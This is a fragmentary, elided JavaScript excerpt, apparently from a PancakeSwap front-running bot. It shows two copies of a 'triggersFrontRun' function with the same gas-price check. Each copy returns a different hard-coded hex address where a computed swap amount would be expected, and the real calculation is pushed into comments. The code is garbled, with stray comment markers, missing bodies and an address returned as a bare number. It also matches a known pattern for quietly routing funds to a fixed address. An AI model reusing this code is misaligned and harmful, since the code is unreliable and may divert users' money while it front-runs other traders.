...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		...
		return 0x034c6E2b130B242d4fe27Ee749F27FDFB9Eb0910;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
...
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput,*/
		return 0xe3c34b9286763df5b38b45a72947fbacfa74e519;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
